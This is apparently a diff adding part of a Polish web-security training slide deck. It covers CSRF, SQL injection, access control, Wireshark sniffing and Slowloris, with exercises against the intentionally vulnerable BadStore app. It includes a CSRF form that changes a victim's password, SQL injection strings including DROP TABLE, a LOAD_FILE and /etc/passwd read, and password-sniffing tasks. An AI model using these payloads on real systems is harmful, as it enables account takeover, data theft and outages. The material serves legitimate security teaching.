+								<li>Przygotowanie strony HTML pozwalającej na wykorzystanie podatności np. dla funkcjonalności zmiany hasła lub zakupu produktu w imieniu innego zalogowanego użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Przykład formularza do ataku CSRF</h3>
+						<pre><code class="html" data-trim contenteditable>
+						&#x3c;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x09;&#x09;&#x09;&#x09;&#x09;&#x09;&#x20;&#x20;&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x09;&#x09;&#x09;&#x09;&#x09;&#x09;&#x20;&#x20;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x68;&#x69;&#x73;&#x74;&#x6f;&#x72;&#x79;&#x2e;&#x70;&#x75;&#x73;&#x68;&#x53;&#x74;&#x61;&#x74;&#x65;&#x28;&#x27;&#x27;&#x2c;&#x20;&#x27;&#x27;&#x2c;&#x20;&#x27;&#x2f;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
+							<form action="http://www.badstore.net/cgi-bin/badstore.cgi?action=moduser" method="POST">
+							  <input type="hidden" name="fullname" value="" />
+							  <input type="hidden" name="newemail" value="" />
+							  <input type="hidden" name="newpasswd" value="qwerty" />
+							  <input type="hidden" name="vnewpasswd" value="qwerty" />
+							  <input type="hidden" name="role" value="U" />
+							  <input type="hidden" name="email" value="test&#64;test&#46;pl" />
+							  <input type="hidden" name="DoMods" value="Change&#32;Account" />
+							  <input type="submit" value="Submit request" />
+							</form>
+						&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x3c;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3e;
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>SQL Injection</h2>
+					</section>
+					
+					<section>
+						<h3>SQL Injection - podstawowe informacje</h3>
+							<ul>
+								<li>Aplikacja otrzymuje od atakującego odpowiednio spreparowane dane.</li> 
+								<li>Dane przekazywane są do zapytania do bazy danych bez odpowiedniej walidacji.</li>
+								<li>Na poziomie bazy danych uruchamiane jest nieautoryzowane zapytanie.</li> 
+							</ul>
+					</section>
+					
+					<section>
+						<h3>SQL Injection - przykład</h3>
+						Przykład modyfikowania zapytań:
+						<pre><code class="hljs" data-trim contenteditable>
+							$q = mysql_query("SELECT * FROM uzytkownicy WHERE uzytkownik = '$uzytkownik'");
+
+							SELECT * FROM uzytkownicy WHERE uzytkownik = 'kowalski'
+
+							SELECT * FROM uzytkownicy WHERE uzytkownik = 'x' OR '1'='1' 
+
+							SELECT * FROM uzytkownicy WHERE uzytkownik = 'x'; DROP TABLE uzytkownicy; SELECT '1'
+						</code></pre>
+					</section>
+					
+					<section>
+					<h3>SQL Injection - testowanie</h3>
+					Pierwszym etapem testu jest próba wywołania standardowego komunikatu błędu bazy danych SQL poprzez dodanie cudzysłowu pojedynczego (’) oraz średnika (;) do wartości testowanego 
+					parametru. Cudzysłów jest używany w SQL jako terminator łańcucha znaków. 
+					Średnik jest natomiast używany do zakończenia instrukcji SQL, tutaj również w przypadku braku filtrowania może dojść do zwrócenia błędu SQL.
+					</section>
+					
+					<section>
+						<h3>SQL Injection - komentarze</h3>
+						<p style="text-align: left;">Przykładowe metody wprowadzania komentarzy w mysql:
+						<ul>
+								<li># komentarz do końca linii</li>
+								<li>-- komentarz do końca linii</li>
+								<li>/* komentarz w środku linii */</li>
+						</ul></p>
+					</section>
+					
+					<section>
+						<h3>Funkcja LOAD_FILE()</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							SELECT * LOAD_FILE('/home/username/myfile.txt')
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 6</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność SQL Injection.</li>
+								<li>Wyświetlenie informacji o wersji bazy danych. Podpowiedź - <i>VERSION()</i></li>
+								<li>Wyświetlenie informacji o użytkownikach. Podpowiedź - tabela z użytkownikami to <i>userdb</i>, nazw kolumn można się domyśleć 
+								na podstawie formularzy logowania i zakładania konta.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 7</h2>
+						<ul>
+							<li>Zalogowanie na konto administratora. Podpowiedź - hasła zapisane są w formie haszy. Wartość można znaleźć np. tutaj <a href="https://md5.gromweb.com/">https://md5.gromweb.com/</a>.</li>
+						</ul>
+					</section>
+				</section>
+					
+				<section>	
+					<section>
+						<h2>Ćwiczenie 8</h2>
+						<ul>
+								<li>Wyświetlenie zawartości pliku <i>/etc/passwd</i></li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 9</h2>
+						<p style="text-align: left;">Wyszukanie innych podatności w aplikacji np.:</p>
+						<ul>
+								<li>Znalezienie ukrytych funkcjonalności administracyjnych.</li>
+								<li>Obejście logiki aplikacji – złożenie zamówienia z miejszą kwotą do zapłaty.</li>
+								<li>Weryfikacja zawartości plików cookie.</i>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ankieta</h2>
+						<a href="http://bit.ly/podatnosci-waw-210719">http://bit.ly/podatnosci-waw-210719</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Broken Access Control</h2>
+					</section>
+				
+					<section>
+						<h3>Broken Access Control (I)</h3>
+						<p>Uzyskanie przez atakującego dostępu do danych, do których nie powinien mieć dostępu, obiektów należących do innego użytkownika, funkcjonalności i stron dla użytkowników o innym zakresie uprawnień. 
+					</section>
+					
+					<section>
+						<h3>Broken Access Control (II)</h3>
+						Przykładowo informacje na temat użytkownika wyświetlane są w odpowiedzi na żądanie: 
+						<pre><code class="hljs" data-trim contenteditable>
+							GET /app/accountInfo?acct=myacct HTTP/1.1
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Broken Access Control (III)</h3>
+						Inny przykład załadowanie plików za pomocą żądania: 
+						<pre><code class="hljs" data-trim contenteditable>
+							GET /servlet.gupld?show=292258 HTTP/1.1
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Broken Access Control - Testowanie (I)</h3>
+						<ul>
+							<li>Aby sprawdzić potencjalną podatność, dla każdej strony dostępnej tylko dla użytkowników zalogowanych należy zweryfikować, czy dane na niej zawarte lub ich część może być uzyskana również bez zalogowania.</li>
+						</ul>
+					</section>
+
+					<section>
+						<h3>Broken Access Control - Testowanie (II)</h3>
+						<ul>
+							<li>Dodatkowo jeśli w części aplikacji dostępnej po zalogowaniu występują dane lub funkcje dostępne jedynie dla części użytkowników należy zweryfikować 
+							czy w każdym przypadku poprawnie weryfikowane są uprawnienia użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Broken Access Control - Testowanie (III)</h3>
+						<ul>
+							<li>Standardowe przykłady podatności dotyczą błędów pozwalających na wyświetlenie danych innego użytkownika przez zmianę identyfikatora przekazywanego 
+							bezpośrednio do zapytania do bazy danych lub też błędów pozwalających na wykonanie pewnej akcji przez znajomość adresu URL lub struktury żądania.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 10</h2>
+						<p style="text-align: left;">Testy podatności kategorii Broken Access Control. Testy należy wykonać z wykorzystaniem konta administratora i konta zwykłego użytkownika. Podpowiedź: <i>?action=adminportal</i> i <i>?action=admin</i>
+						<br><br>Zakres rozszerzony - utworzenie konta administratora.
+						</p>				
+					</section>
+				</section>
+				
+				<section>
+	
+					<section>
+						<h2>Wireshark</h2>
+					</section>
+					
+					<section>
+						<h3>Wireshark</h3>
+						<p>Umożliwia przechwytywanie i nagrywanie pakietów danych, a także ich dekodowanie. Dzięki dużej ilości dodatków potrafi rozpoznać i zdekodować 
+						wiele protokołów komunikacyjnych. W głównej mierze jest wykorzystywany przez administratorów sieci.</p>
+					</section>
+					
+					<section>
+						<h3>Filtrowanie i wyszukiwanie w Wireshark</h3>
+						<p>Przydatne podczas korzystania z Wireshark:</p>
+						<ul>
+							<li>Filtry np. <i>ip.addr == 192.168.1.14</i></li>
+							<li>Podążaj -> Strumień TCP</li>
+							<li>Wyszukiwanie - Szczegóły pakietu - String</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Wireshark - GUI</h3>
+						<img height="498" data-src="pictures/wireshark.png" alt="Wireshark">
+					</section>
+					
+					<section>
+						<h3>Wireshark - Wyszukiwanie po zawartości pakietu</h3>
+						<img height="458" data-src="pictures/wireshark_szukaj.png" alt="Wireshark wyszukiwanie">
+					</section>
+				</section>
+					
+				<section>
+					<section>
+						<h2>Ćwiczenie 11</h2>
+						<p style="text-align: left;">Podsłuchanie komunikacji nieszyfrowanej. Wyświetlenie loginów i haseł wpisanych podczas logowania.</p>					
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ataki Slow HTTP - Slowloris</h2>
+					</section>
+					
+					<section>
+						<h2>Slowloris (I)</h2>
+						<p>Podczas ataku tworzona jest duża liczba gniazd, a następnie w specyficzny powolny sposób dosyłane są dane częściowych żądań HTTP, tak aby podtrzymać 
+						połączenie, co po pewnym czasie skutkuje wyczerpaniem puli wolnych wątków obsługujących żądania HTTP. 
+						<br>
+						Jeśli osiągnięta zostanie maksymalna liczba równoczesnych połączeń serwer będzie odrzucać dodatkowe próby połączenia od innych klientów.
+						</p>
+					</section>	
+						
+					<section>
+						<h3>Slowloris (II)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							Host: elka.pw.edu.pl.pl&lt;CRLF&gt;
+							User-Agent: Mozilla Firefox&lt;CRLF&gt;
+							Connection:keep-alive&lt;CRLF&gt;
+							X-Custom-Header: wartość nagłówka&lt;CRLF&gt;
+							&lt;SP&gt;dalsza wartość nagłówka&lt;CRLF&gt;
+							&lt;CRLF&gt;
+							Ciało zapytania
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Slowloris (III)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							Host: elka.pw.edu.pl.pl&lt;CRLF&gt;
+							User-Agent: Mozilla Firefox&lt;CRLF&gt;
+							Connection:keep-alive&lt;CRLF&gt;
+							X-Custom-Header: wartość nagłówka&lt;CRLF&gt;
+							&lt;SP&gt;dalsza wartość nagłówka&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+						</code></pre>
+						<a href="https://sekurak.pl/ataki-slow-http-dos-cz-1-slowloris/">Więcej informacji - Sekurak</a> | 
+						<a href="https://github.com/shekyan/slowhttptest">Narzędzie do testów - SlowHTTPTest</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Skanery automatyczne</h2>
+					</section>
+					
+					<section>
+						<h3>Skanery automatyczne</h3>
+						<ul>
+							<li>Arachni</li>
+							<li>Nikto</li>
+							<li>Burp Suite</li>
+							<li>OWASP ZAP</li>
+							<li>OpenVas</li>
+							<li>Skipfish</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Arachni</h3>
+						<img height="478" data-src="pictures/Arachni.png" alt="Arachni">
+					</section>
+					
+					<section>
+						<h3>OpenVas</h3>
+						<img height="498" data-src="pictures/openvas.png" alt="OpenVas">
+					</section>
+				</section>
+				
+				<section>
+				
+					<section>
+						<h2>Podsumowanie<h2>
+					</section>	
+						
+					<section>
+					<h3>Podsumowanie (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li><b>Skanowanie portów</b></li>
+						</ul>
+					</section>
+						
+					<section>
+					<h3>Podsumowanie (II)</h3>
+						<ul>
+							<li><b>Przegląd baz danych podatności</b></li>
+							<li><b>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</b></li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Podsumowanie (III)</h3>
+						<ul>
+							<li><b>Ataki CSRF, przygotowanie przykładowej strony HTML wykonującej atak</li>
+							<li>SQL Injection</li>
+							<li>Podatności kategorii Broken Access Control</li>
+							<li>Podsłuchanie komunikacji nieszyfrowanej z wykorzystaniem Wireshark</b></li>
+							<li>Ataki Slow HTTP</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/tlo_1.jpg" data-state="dimbg">
+					<h1>Dziękuję za uwagę</h1>
+				</section>
+				
+				<section>
+				<section>
+				<h2>Organizacyjne</h2>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/Slajd2.JPG">
+					<h2 id="no-header">Organizacyjne (I)</h2>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/Slajd3.JPG">
+					<h2 id="no-header">Organizacyjne (II)</h2>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/Slajd4.JPG">
+					<h2 id="no-header">Organizacyjne (III)</h2>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/Slajd5.JPG">
+					<h2 id="no-header">Organizacyjne (IV)</h2>
+				</section>
+				
+				</section>
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/search/search.js', async: true },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/menu/menu.js'},
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
